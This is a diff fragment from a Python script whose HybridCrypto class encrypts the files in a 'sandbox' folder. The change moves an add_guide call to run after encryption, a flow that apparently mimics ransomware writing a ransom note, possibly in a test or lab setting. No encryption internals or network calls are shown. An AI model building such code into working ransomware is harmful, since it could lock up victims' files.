@@ -149,8 +149,8 @@ class HybridCrypto:
 if __name__ == "__main__":
     scaned_folder = "sandbox"
     crypto = HybridCrypto()
-    crypto.add_guide(scaned_folder)
     files = crypto.encrypt_sandbox(scaned_folder)
+    crypto.add_guide(scaned_folder)
     
 
     print("[INFO - excute] Encryption completed. Encrypted files:")
